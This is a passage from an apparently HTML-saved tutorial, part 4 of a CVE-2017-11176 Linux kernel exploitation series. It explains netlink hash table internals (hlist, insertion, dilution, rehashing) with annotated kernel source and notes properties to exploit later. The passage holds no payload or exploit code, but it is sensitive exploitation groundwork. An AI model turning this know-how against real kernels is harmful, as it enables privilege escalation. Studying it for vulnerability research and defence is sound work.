<span class="cm"> * Double linked lists with a single pointer list head.</span>
<span class="cm"> * Mostly useful for hash tables where the two pointer list head is</span>
<span class="cm"> * too wasteful.</span>
<span class="cm"> * You lose the ability to access the tail in O(1).       // &lt;----- this</span>
<span class="cm"> */</span><span class="w"></span>

<span class="k">struct</span> <span class="nc">hlist_head</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">hlist_node</span><span class="w"> </span><span class="o">*</span><span class="n">first</span><span class="p">;</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>

<span class="k">struct</span> <span class="nc">hlist_node</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">hlist_node</span><span class="w"> </span><span class="o">*</span><span class="n">next</span><span class="p">,</span><span class="w"> </span><span class="o">**</span><span class="n">pprev</span><span class="p">;</span><span class="w"> </span><span class="c1">// &lt;----- note the "pprev" type (pointer of pointer)</span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p>So, the hash table is composed of one or multiple buckets. Each element in a given bucket is in a <strong>non-circular</strong> doubly linked list. It means:</p><ul><li>the last element in a bucket's list points to <em>NULL</em></li><li>the first element's <em>pprev</em> pointer in the bucket list points to the <em>hlist_head's first</em> pointer (hence the pointer of pointer).</li></ul><p>The bucket itself is represented with a <em>hlist_head</em> which has a <strong>single pointer</strong>. In other words, <strong>we can't access the tail from a bucket's head</strong>. We need to walk the whole list (cf. the commentary).</p><p>In the end, a typical hash table looks like this:</p><p></p><figure><img src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 4_files/typical_hashtable.png" title="Typical Hashtable"><figcaption class="figcaption figure-caption text-center">typical_hashtable.png</figcaption></figure><p></p><p>You may want to check this <a href="https://kernelnewbies.org/FAQ/Hashtables">FAQ</a> (from kernelnewbies.org) for a usage example (just like we did with <em>list_head</em> in "Core Concept #3").</p><h2 id="netlink-hash-tables-initialization">Netlink Hash Tables Initialization</h2><p>Let's get back to the netlink's hash tables initialization code which can be split in two parts.</p><p>First, an <strong>order</strong> value is computed based on the <strong>totalram_pages</strong> global variable. The later is computed during boot-time and, as the name suggested, (roughly) represents the number of page frames available in RAM. For instance, on a 512MB system, the <em>max_shift</em> will be something like 16 (i.e. 65k buckets per hash table).</p><p>Secondly, <strong>a distinct hash table is created for every netlink protocol</strong>:</p><div class="highlight"><pre><span></span><code><span class="w">      </span><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">__init</span><span class="w"> </span><span class="n">netlink_proto_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="w">      </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="c1">// ... cut ...</span>

<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">MAX_LINKS</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">          </span><span class="k">struct</span> <span class="nc">nl_pid_hash</span><span class="w"> </span><span class="o">*</span><span class="n">hash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">nl_table</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">hash</span><span class="p">;</span><span class="w"></span>

<span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">       </span><span class="n">hash</span><span class="o">-&gt;</span><span class="n">table</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nl_pid_hash_zalloc</span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">hash</span><span class="o">-&gt;</span><span class="n">table</span><span class="p">));</span><span class="w"></span>
<span class="w">          </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">hash</span><span class="o">-&gt;</span><span class="n">table</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="c1">// ... cut (free everything and panic!) ...</span>
<span class="w">          </span><span class="p">}</span><span class="w"></span>
<span class="w">          </span><span class="n">hash</span><span class="o">-&gt;</span><span class="n">max_shift</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">order</span><span class="p">;</span><span class="w"></span>
<span class="w">          </span><span class="n">hash</span><span class="o">-&gt;</span><span class="n">shift</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w">       </span><span class="n">hash</span><span class="o">-&gt;</span><span class="n">mask</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="w">          </span><span class="n">hash</span><span class="o">-&gt;</span><span class="n">rehash_time</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">jiffies</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>

<span class="w">        </span><span class="c1">// ... cut ...</span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>In [0], the hash table is allocated with <strong>a single bucket</strong>. Hence the <em>mask</em> is set to zero in [1] (number of buckets minus one). Remember, the field <em>hash-&gt;table</em> is an array of <em>struct hlist_head</em>, each pointing to a bucket list head.</p><h2 id="basic-netlink-hash-table-insertion">Basic Netlink Hash Table Insertion</h2><p>Alright, now we know the initial state of netlink hash tables (only one bucket), let's study the insertion algorithm which starts in <strong>netlink_insert()</strong>. In this section, we will only consider the "basic" case (i.e. discard the "dilute" mechanism).</p><p>The purpose of <em>netlink_insert()</em> is to insert a <em>sock's hlist_node</em> into a hash table using the provided <em>pid</em> in argument. <strong>A <em>pid</em> can only appear once per hash table</strong>.</p><p>First, let's study the beginning of the <em>netlink_insert()</em> code:</p><div class="highlight"><pre><span></span><code><span class="w">      </span><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">netlink_insert</span><span class="p">(</span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sk</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">net</span><span class="w"> </span><span class="o">*</span><span class="n">net</span><span class="p">,</span><span class="w"> </span><span class="n">u32</span><span class="w"> </span><span class="n">pid</span><span class="p">)</span><span class="w"></span>
<span class="w">      </span><span class="p">{</span><span class="w"></span>
<span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">     </span><span class="k">struct</span> <span class="nc">nl_pid_hash</span><span class="w"> </span><span class="o">*</span><span class="n">hash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">nl_table</span><span class="p">[</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_protocol</span><span class="p">].</span><span class="n">hash</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="k">struct</span> <span class="nc">hlist_head</span><span class="w"> </span><span class="o">*</span><span class="n">head</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="n">EADDRINUSE</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">osk</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="k">struct</span> <span class="nc">hlist_node</span><span class="w"> </span><span class="o">*</span><span class="n">node</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">len</span><span class="p">;</span><span class="w"></span>

<span class="p">[</span><span class="mi">1</span><span class="n">a</span><span class="p">]</span><span class="w">    </span><span class="n">netlink_table_grab</span><span class="p">();</span><span class="w"></span>
<span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w">     </span><span class="n">head</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nl_pid_hashfn</span><span class="p">(</span><span class="n">hash</span><span class="p">,</span><span class="w"> </span><span class="n">pid</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="w">     </span><span class="n">sk_for_each</span><span class="p">(</span><span class="n">osk</span><span class="p">,</span><span class="w"> </span><span class="n">node</span><span class="p">,</span><span class="w"> </span><span class="n">head</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="w">       </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">net_eq</span><span class="p">(</span><span class="n">sock_net</span><span class="p">(</span><span class="n">osk</span><span class="p">),</span><span class="w"> </span><span class="n">net</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">nlk_sk</span><span class="p">(</span><span class="n">osk</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">pid</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">pid</span><span class="p">))</span><span class="w"></span>
<span class="w">            </span><span class="k">break</span><span class="p">;</span><span class="w"></span>
<span class="w">          </span><span class="n">len</span><span class="o">++</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>
<span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="w">     </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">node</span><span class="p">)</span><span class="w"></span>
<span class="w">          </span><span class="k">goto</span><span class="w"> </span><span class="n">err</span><span class="p">;</span><span class="w"></span>

<span class="w">        </span><span class="c1">// ... cut ...</span>

<span class="w">      </span><span class="nl">err</span><span class="p">:</span><span class="w"></span>
<span class="p">[</span><span class="mi">1</span><span class="n">b</span><span class="p">]</span><span class="w">    </span><span class="n">netlink_table_ungrab</span><span class="p">();</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">err</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>The previous code does:</p><ul><li><strong>[0]</strong>: retrieve the <em>nl_pid_hash</em> (i.e hash table) for the given protocol (e.g. <em>NETLINK_USERSOCK</em>)</li><li><strong>[1a]</strong>: protect access to all netlink hash tables with a lock</li><li><strong>[2]</strong>: retrieve a pointer to a bucket (i.e. a <em>hlist_head</em>) using the _pid argument as a key of the hash function</li><li><strong>[3]</strong>: walk the bucket's doubly linked-list and...</li><li><strong>[4]</strong>: ... check for collision on the <em>pid</em></li><li><strong>[5]</strong>: if the <em>pid</em> was found in the bucket's list (<em>node</em> is not NULL), jump to <em>err</em>. It will return a <em>-EADDRINUSE</em> error.</li><li><strong>[1b]</strong>: release the netlink hash tables lock</li></ul><p>Except [2], this is pretty straightforward: find the proper bucket and scan it to check if the <em>pid</em> does not already exist.</p><p>Next comes a bunch of sanity checks:</p><div class="highlight"><pre><span></span><code><span class="w">        </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="n">EBUSY</span><span class="p">;</span><span class="w"></span>
<span class="p">[</span><span class="mi">6</span><span class="p">]</span><span class="w">     </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">nlk_sk</span><span class="p">(</span><span class="n">sk</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">)</span><span class="w"></span>
<span class="w">          </span><span class="k">goto</span><span class="w"> </span><span class="n">err</span><span class="p">;</span><span class="w"></span>

<span class="w">        </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span><span class="w"></span>
<span class="p">[</span><span class="mi">7</span><span class="p">]</span><span class="w">     </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">BITS_PER_LONG</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">32</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">unlikely</span><span class="p">(</span><span class="n">hash</span><span class="o">-&gt;</span><span class="n">entries</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">UINT_MAX</span><span class="p">))</span><span class="w"></span>
<span class="w">          </span><span class="k">goto</span><span class="w"> </span><span class="n">err</span><span class="p">;</span><span class="w"></span>
</code></pre></div><p>In [6], the <em>netlink_insert()</em> code makes sure that the <em>sock</em> being inserted in the hash table does not already have a <em>pid</em> set. In other words, it checks that it hasn't already been inserted into the hash table. The check at [7] is simply a <em>hard limit</em>. A Netlink hash table can't have more than 4 Giga elements (that's still a lot!).</p><p>Finally:</p><div class="highlight"><pre><span></span><code><span class="p">[</span><span class="mi">8</span><span class="p">]</span><span class="w">     </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">len</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">nl_pid_hash_dilute</span><span class="p">(</span><span class="n">hash</span><span class="p">,</span><span class="w"> </span><span class="n">len</span><span class="p">))</span><span class="w"></span>
<span class="p">[</span><span class="mi">9</span><span class="p">]</span><span class="w">       </span><span class="n">head</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nl_pid_hashfn</span><span class="p">(</span><span class="n">hash</span><span class="p">,</span><span class="w"> </span><span class="n">pid</span><span class="p">);</span><span class="w"></span>
<span class="p">[</span><span class="mi">10</span><span class="p">]</span><span class="w">    </span><span class="n">hash</span><span class="o">-&gt;</span><span class="n">entries</span><span class="o">++</span><span class="p">;</span><span class="w"></span>
<span class="p">[</span><span class="mi">11</span><span class="p">]</span><span class="w">    </span><span class="n">nlk_sk</span><span class="p">(</span><span class="n">sk</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">pid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pid</span><span class="p">;</span><span class="w"></span>
<span class="p">[</span><span class="mi">12</span><span class="p">]</span><span class="w">    </span><span class="n">sk_add_node</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span><span class="w"> </span><span class="n">head</span><span class="p">);</span><span class="w"></span>
<span class="p">[</span><span class="mi">13</span><span class="p">]</span><span class="w">    </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
</code></pre></div><p>Which does:</p><ul><li><strong>[8]</strong>: if the current bucket has <em>at least</em> one element, calls <em>nl_pid_hash_dilute()</em> (cf. next section)</li><li><strong>[9]</strong>: if the hash table has been <em>diluted</em>, find the new bucket pointer (<em>hlist_head</em>)</li><li><strong>[10]</strong>: increase the total number of elements in the hash table</li><li><strong>[11]</strong>: set the sock's <em>pid</em> field</li><li><strong>[12]</strong>: <strong>add the sock's <em>hlist_node</em> into the doubly-linked bucket's list</strong></li><li><strong>[13]</strong>: reset <em>err</em> since <em>netlink_insert()</em> succeeds</li></ul><p>Before going further, let's see a couple of things. If we unroll <em>sk_add_node()</em>, we can see that:</p><ul><li>it takes a reference on the <em>sock</em> (i.e. increase the refcounter)</li><li>it calls <em>hlist_add_head(&amp;sk-&gt;sk_node, list)</em></li></ul><p>In other words, when a <em>sock</em> is inserted into a hash table, <strong>it is always inserted at the head of a bucket</strong>. We will use this property later on, keep this in mind.</p><p>Finally, let's look at the hash function:</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="k">struct</span> <span class="nc">hlist_head</span><span class="w"> </span><span class="o">*</span><span class="n">nl_pid_hashfn</span><span class="p">(</span><span class="k">struct</span> <span class="nc">nl_pid_hash</span><span class="w"> </span><span class="o">*</span><span class="n">hash</span><span class="p">,</span><span class="w"> </span><span class="n">u32</span><span class="w"> </span><span class="n">pid</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="o">&amp;</span><span class="n">hash</span><span class="o">-&gt;</span><span class="n">table</span><span class="p">[</span><span class="n">jhash_1word</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span><span class="w"> </span><span class="n">hash</span><span class="o">-&gt;</span><span class="n">rnd</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">hash</span><span class="o">-&gt;</span><span class="n">mask</span><span class="p">];</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>As expected, this function is just about computing the bucket index of the <em>hash-&gt;table</em> array which is wrapped using the <em>mask</em> field of the hash table and return the <em>hlist_head</em> pointer representing the bucket.</p><p>The hash function itself being <strong>jhash_1word()</strong> which is the Linux implementation of the <a href="https://en.wikipedia.org/wiki/Jenkins_hash_function">Jenkins hash function</a>. It is not required to understand the implementation but note that it uses two "keys" (<em>pid</em> and <em>hash-&gt;rnd</em>) and assume this is not "reversible".</p><p>One might have noticed that <strong>without the "dilute" mechanism, the hash table actually never extends</strong>. Since it is initialized with one bucket, elements are simply stored in a single doubly-linked list... pretty useless utilization of hash tables!</p><h2 id="the-netlink-hash-table-dilution-mechanism">The Netlink Hash Table "Dilution" Mechanism</h2><p>As stated above, by the end of <em>netlink_insert()</em> the code calls <strong>nl_pid_hash_dilute()</strong> if <em>len</em> is not zero (i.e. the bucket is not empty). If the "dilution" succeeds, it searches a new bucket to add the sock element (the hash table has been "rehashed"):</p><div class="highlight"><pre><span></span><code><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">len</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">nl_pid_hash_dilute</span><span class="p">(</span><span class="n">hash</span><span class="p">,</span><span class="w"> </span><span class="n">len</span><span class="p">))</span><span class="w"></span>
<span class="w">        </span><span class="n">head</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nl_pid_hashfn</span><span class="p">(</span><span class="n">hash</span><span class="p">,</span><span class="w"> </span><span class="n">pid</span><span class="p">);</span><span class="w"></span>
</code></pre></div><p>Let's check the implementation:</p><div class="highlight"><pre><span></span><code><span class="w">      </span><span class="k">static</span><span class="w"> </span><span class="kr">inline</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">nl_pid_hash_dilute</span><span class="p">(</span><span class="k">struct</span> <span class="nc">nl_pid_hash</span><span class="w"> </span><span class="o">*</span><span class="n">hash</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">len</span><span class="p">)</span><span class="w"></span>
<span class="w">      </span><span class="p">{</span><span class="w"></span>
<span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">     </span><span class="kt">int</span><span class="w"> </span><span class="n">avg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">hash</span><span class="o">-&gt;</span><span class="n">entries</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">hash</span><span class="o">-&gt;</span><span class="n">shift</span><span class="p">;</span><span class="w"></span>

<span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w">     </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">avg</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">nl_pid_hash_rehash</span><span class="p">(</span><span class="n">hash</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">))</span><span class="w"></span>
<span class="w">          </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>

<span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w">     </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">len</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">avg</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">time_after</span><span class="p">(</span><span class="n">jiffies</span><span class="p">,</span><span class="w"> </span><span class="n">hash</span><span class="o">-&gt;</span><span class="n">rehash_time</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">          </span><span class="n">nl_pid_hash_rehash</span><span class="p">(</span><span class="n">hash</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
<span class="w">          </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>

<span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="w">     </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>Fundamentally, what this function is trying to do is:</p><ol><li>it makes sure there are "enough" buckets in the hash table to minimize collision, otherwise try to grow the hash table</li><li>it keeps all buckets balanced</li></ol><p>As we will see in the next section, when the hash table "grows", the number of buckets is multiplied by two. Because of this, the expression at [0], is equivalent to:</p><div class="highlight"><pre><span></span><code>avg = nb_elements / (2^(shift))     &lt;===&gt;     avg = nb_elements / nb_buckets
</code></pre></div><p><strong>It computes the <em>load factor</em> of the hash table.</strong></p><p>The check at [1] is true when the average number of elements per bucket is greater or equal to 2. In other words, <strong>the hash table has "on average" two elements per bucket</strong>. If a third element is about to be added, the hash table is expanded and then diluted through "rehashing".</p><p>The check at [2] is kinda similar to [1], the difference being that the hash table isn't expanded. Since <em>len</em> is greater than <em>avg</em> which is greater than 1, when trying to add a third element into a bucket, the whole hash table is again diluted and "rehashed". On the other hand, if the table is mostly empty (i.e. <em>avg</em> equals zero), then trying to add into a non-empty bucket (len &gt; 0) provokes a "dilution". Since this operation is costly (<em>O(N)</em>) and can happen at every insertion under certain circumstance (e.g. can't grow anymore), its occurrence is limited with <em>rehash_time</em>.</p><p><strong>NOTE</strong>: <em>jiffies</em> is a measure of time, see <a href="https://elinux.org/Kernel_Timer_Systems">Kernel Timer Systems</a>.</p><p>In the end, the way netlink stores elements in its hash tables is a <strong>1:2 mapping on average</strong>. The only exception is when the hash table can't grow anymore. In that case, it slowly becomes a 1:3, 1:4 mapping, etc. Reaching this point means that there are more than 128k netlink sockets or so. From the exploiter point of view, chances are that you will be limited by the number of opened file descriptors before reaching this point.</p><h2 id="netlink-rehashing">Netlink "Rehashing"</h2><p>In order to finish our understanding of the netlink hash table insertion, let's quickly review <em>nl_pid_hash_rehash()</em>:</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">nl_pid_hash_rehash</span><span class="p">(</span><span class="k">struct</span> <span class="nc">nl_pid_hash</span><span class="w"> </span><span class="o">*</span><span class="n">hash</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">grow</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">omask</span><span class="p">,</span><span class="w"> </span><span class="n">mask</span><span class="p">,</span><span class="w"> </span><span class="n">shift</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">size_t</span><span class="w"> </span><span class="n">osize</span><span class="p">,</span><span class="w"> </span><span class="n">size</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">hlist_head</span><span class="w"> </span><span class="o">*</span><span class="n">otable</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">table</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="n">omask</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">mask</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">hash</span><span class="o">-&gt;</span><span class="n">mask</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">osize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">mask</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">table</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">shift</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">hash</span><span class="o">-&gt;</span><span class="n">shift</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">grow</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">++</span><span class="n">shift</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">hash</span><span class="o">-&gt;</span><span class="n">max_shift</span><span class="p">)</span><span class="w"></span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="n">mask</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">mask</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="n">size</span><span class="w"> </span><span class="o">*=</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>

<span class="w">    </span><span class="n">table</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nl_pid_hash_zalloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">table</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="n">otable</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">hash</span><span class="o">-&gt;</span><span class="n">table</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">hash</span><span class="o">-&gt;</span><span class="n">table</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">table</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">hash</span><span class="o">-&gt;</span><span class="n">mask</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">mask</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">hash</span><span class="o">-&gt;</span><span class="n">shift</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">shift</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">get_random_bytes</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hash</span><span class="o">-&gt;</span><span class="n">rnd</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">hash</span><span class="o">-&gt;</span><span class="n">rnd</span><span class="p">));</span><span class="w"></span>

<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">omask</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sk</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="k">struct</span> <span class="nc">hlist_node</span><span class="w"> </span><span class="o">*</span><span class="n">node</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">tmp</span><span class="p">;</span><span class="w"></span>

<span class="w">        </span><span class="n">sk_for_each_safe</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span><span class="w"> </span><span class="n">node</span><span class="p">,</span><span class="w"> </span><span class="n">tmp</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">otable</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="w"></span>
<span class="w">            </span><span class="n">__sk_add_node</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span><span class="w"> </span><span class="n">nl_pid_hashfn</span><span class="p">(</span><span class="n">hash</span><span class="p">,</span><span class="w"> </span><span class="n">nlk_sk</span><span class="p">(</span><span class="n">sk</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">));</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>

<span class="w">    </span><span class="n">nl_pid_hash_free</span><span class="p">(</span><span class="n">otable</span><span class="p">,</span><span class="w"> </span><span class="n">osize</span><span class="p">);</span><span class="w"></span>
